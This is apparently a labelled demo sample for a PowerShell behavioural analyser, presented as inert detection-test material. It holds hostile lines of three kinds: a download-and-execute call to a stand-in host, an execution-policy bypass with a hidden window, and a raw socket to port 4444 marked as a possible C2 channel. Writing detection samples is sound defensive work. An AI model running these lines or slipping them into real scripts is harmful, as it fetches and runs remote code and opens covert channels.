# DEMO - inert sample for the behavioural analyser (never executed).
# The hostnames below do not exist; nothing is ever run.

# Indicator: download and execute (IEX combined with a download call)
IEX (New-Object Net.WebClient).DownloadString('http://malware-sample.example.com/x.ps1')

# Indicator: execution policy bypass
$psArgs = "-ExecutionPolicy Bypass -WindowStyle Hidden"

# Indicator: raw socket usage (possible C2 channel)
$tcp = New-Object System.Net.Sockets.TcpClient('10.0.0.9', 4444)
